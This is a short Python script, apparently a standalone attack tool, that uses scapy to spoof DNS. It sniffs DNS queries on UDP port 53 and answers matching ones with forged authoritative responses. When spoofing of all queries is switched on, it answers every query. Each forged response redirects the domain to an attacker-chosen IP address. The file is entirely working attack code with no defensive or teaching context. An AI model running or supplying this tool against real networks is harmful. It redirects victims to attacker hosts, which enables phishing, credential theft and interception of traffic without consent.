from scapy.all import *

TARGET_DOMAIN = ""
ATTACKER_IP = ""
VERBOSE_MODE = False
SPOOF_ALL = False

def dns_response(packet):
    global TARGET_DOMAIN, ATTACKER_IP, VERBOSE_MODE, SPOOF_ALL

    # Check if packet is DNS query and not response
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        qname = packet[DNSQR].qname.decode('utf-8')

        # Check if domain matches target
        if SPOOF_ALL or (TARGET_DOMAIN in qname):
        

            # Create spoofed DNS response
            spoofed_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                          UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / \
                          DNS(id=packet[DNS].id,          
                              qr=1,                       
                              aa=1,                       
                              rd=1,                       
                              qd=packet[DNS].qd,          
                              an=DNSRR(rrname=qname,     
                                       ttl=10, 
                                       rdata=ATTACKER_IP))    
            
            send(spoofed_packet, verbose=False)

def start_dns_spoof(target_domain_arg, attacker_ip_arg, verbose=True, spoof_all=False):
    global TARGET_DOMAIN, ATTACKER_IP, VERBOSE_MODE, SPOOF_ALL
    TARGET_DOMAIN = target_domain_arg
    ATTACKER_IP = attacker_ip_arg
    VERBOSE_MODE = verbose
    SPOOF_ALL = spoof_all

    opmode_message = "ALL DNS QUERIES" if SPOOF_ALL else f"Target Domain: {TARGET_DOMAIN}"


    print(f"[+] Starting DNS spoofing for {opmode_message}")
    sniff(filter="udp port 53", prn=dns_response, store=0)